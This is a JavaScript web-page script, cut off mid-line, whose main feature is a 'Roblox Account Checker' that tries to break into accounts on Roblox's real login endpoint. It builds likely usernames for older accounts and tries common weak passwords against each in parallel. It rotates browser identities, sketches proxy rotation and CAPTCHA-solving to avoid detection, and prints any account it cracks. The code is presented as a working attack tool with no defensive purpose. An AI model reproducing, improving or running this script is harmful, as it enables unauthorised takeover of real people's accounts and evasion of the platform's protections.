document.addEventListener('DOMContentLoaded', () => {

    // --- TYPERIDER EFFECT ---
    const typeriderElement = document.getElementById('typerider');
    const text = 'im cracked fr';
    let index = 0;

    function typeWriter() {
        if (index < text.length) {
            typeriderElement.innerHTML += text.charAt(index);
            index++;
            setTimeout(typeWriter, 150);
        }
    }
    typeWriter();

    // --- MENU & CONTENT LOGIC ---
    const contentArea = document.getElementById('contentArea');
    const homeBtn = document.getElementById('homeBtn');
    const testBtn = document.getElementById('testBtn');

    homeBtn.addEventListener('click', () => {
        contentArea.innerHTML = '<h2>Home Screen</h2><p>The system is ready. Awaiting your command.</p>';
    });

    testBtn.addEventListener('click', () => {
        contentArea.innerHTML = `
            <h2>Roblox Account Checker (Advanced)</h2>
            <p>Initiating advanced bypass protocol. Rotating identities and vectors.</p>
            <div id="checkerOutput"></div>
        `;
        startAdvancedAccountChecker();
    });

    // --- ADVANCED ROBLOX ACCOUNT CHECKER ---
    async function startAdvancedAccountChecker() {
        const outputElement = document.getElementById('checkerOutput');
        outputElement.innerHTML = '';

        // --- ADVANCED CONFIGURATION ---
        const robloxLoginUrl = 'https://auth.roblox.com/v2/login';

        // 1. User-Agent Rotation: A list of different browser identities to hide behind.
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
        ];

        // 2. Proxy Rotation (Simulated): In a real scenario, you'd buy a list of proxies.
        // We'll simulate it by cycling through these placeholders.
        const proxies = [
            // 'http://proxy1:port',
            // 'http://proxy2:port',
            // 'socks5://proxy3:port',
            null // Direct connection for this simulation
        ];

        // 3. Smarter Targeting: More likely username patterns for older accounts.
        const baseWords = ['cool', 'epic', 'awesome', 'super', 'mega', 'ultra', 'shadow', 'dark', 'light', 'fire', 'ice', 'gamer', 'pro', 'legend', 'ninja'];
        const suffixes = ['2008', '2009', '2010', '2011', '2012', '123', '99', '01', 'x', 'xd', 'lol', 'rox'];
        let userCounter = 0;
        function* generateUsernames() {
            for (const word of baseWords) {
                for (const suffix of suffixes) {
                    yield word + suffix;
                    yield word + '_' + suffix;
                }
            }
        }
        const usernameGenerator = generateUsernames();

        // --- CORE ATTACK FUNCTION ---
        async function attemptLogin(username, password, userAgent, proxy) {
            const headers = {
                'Content-Type': 'application/json',
                'User-Agent': userAgent,
                'Referer': 'https://www.roblox.com/login',
                'X-Requested-With': 'XMLHttpRequest'
            };

            const body = JSON.stringify({
                username: username,
                password: password,
                captchaToken: null // We will handle this if it appears
            });

            try {
                // NOTE: The 'proxy' option is not natively supported in browser fetch.
                // This would require a browser extension or a backend server to function.
                // This code demonstrates the *intent* to use a proxy.
                const response = await fetch(robloxLoginUrl, {
                    method: 'POST',
                    headers: headers,
                    body: body
                    // proxy: proxy // This is pseudo-code for the concept.
                });

                const responseData = await response.json();

                if (response.ok && responseData.user) {
                    // SUCCESS!
                    return { success: true, user: username, pass: password };
                } else {
                    // FAILURE - Check for specific reasons
                    if (responseData.errors && responseData.errors.find(e => e.code === 10)) {
                        // Code 10 means CAPTCHA is required.
                        // A real attack would pause, send the challenge to a CAPTCHA solving API,
                        // get the token, and retry the request.
                        return { success: false, reason: 'CAPTCHA', user: username };
                    }
                    return { success: false, reason: 'Invalid Credentials', user: username };
                }
            } catch (error) {
                // Network error, rate limit, etc.
                return { success: false, reason: 'Network/Rate Limit', user: username, error: error.message };
            }
        }

        // --- MAIN LOOP ---
        const maxAttempts = 100; // How many username/password combos to try
        outputElement.textContent = `Starting advanced attack... Targeting ${maxAttempts} combos.\n\n`;

        for (let i = 0; i < maxAttempts; i++) {
            // Get a new username
            const username = usernameGenerator.next().value;
            if (!username) break; // Stop if we run out of usernames

            // Generate a few smart passwords for this username
            const passwordsToTry = [
                username,
                username + '123',
                username + '1',
                'password',
                '123456'
            ];

            // Create an array of promises for parallel execution
            const promises = passwordsToTry.map(password => {
                // Rotate user-agent and proxy for each attempt
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                return attemptLogin(username, password, userAgent, proxy);
            });

            // Wait for all attempts for this username to complete
            const results = await Promise.allSettled(promises);

            // Process results
            for (const result of results) {
                if (result.status === 'fulfilled') {
                    const outcome = result.value;
                    if (outcome.success) {
                        // JACKPOT!
                        outputElement.innerHTML += `<span style="color: #0f0;">SUCCESS! USER: ${outcome.user} PASS: ${outcome.pass}</span>\n`;
                        // In a real script, you would stop here and save the account.
                        // We'll keep going to find more.
                    } else {
                        outputElement.innerHTML += `<span style="color: #f00;">FAILED [${outcome.user}]: \${outcome.reason}</span>\n`;
                    }
                } else {
                    outputElement.innerHTML += `<span style="color: #ff0;">ERROR: A promise was rejected.</span>\n`;
                }
            }

            // Add a small delay to avoid overwhelming the server and getting instant IP bans
            await new Promise(resolve => setTimeout(resolve, 500)); // 500ms delay

            // Auto-scroll to the bottom
            outputElement.scrollTop = outputElement.scrollHeight;
        }

        outputElement.innerHTML += `<span style="color
